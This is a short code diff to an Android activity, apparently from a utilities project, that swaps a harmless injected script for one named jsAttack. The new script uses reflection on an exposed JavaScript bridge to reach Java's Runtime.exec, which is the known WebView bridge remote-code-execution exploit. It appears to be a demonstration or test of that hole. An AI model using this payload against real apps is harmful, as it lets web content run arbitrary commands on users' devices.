@@ -47,9 +47,28 @@ class HybridActivity : AppCompatActivity() {
                 document.body.style.backgroundColor = "rgba(0,0,0,125)"
             })();
                 """
+
+
+            val jsAttack = """
+                (function(){
+                    for (var obj in window) {
+                        if ("getClass" in window[obj]) {
+                             alert(obj);
+                            return  window[obj].getClass().forName("java.lang.Runtime")
+                                     .getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+                        }
+                    }
+                })();
+                """
+
+//            Khybrid()
+//                    .injectJs(jsString)
+//                    .loadUrl(this, "https://github.com/jiangkang/KTools")
+
             Khybrid()
-                    .injectJs(jsString)
+                    .injectJs(jsAttack)
                     .loadUrl(this, "https://github.com/jiangkang/KTools")
+
         }
 
 
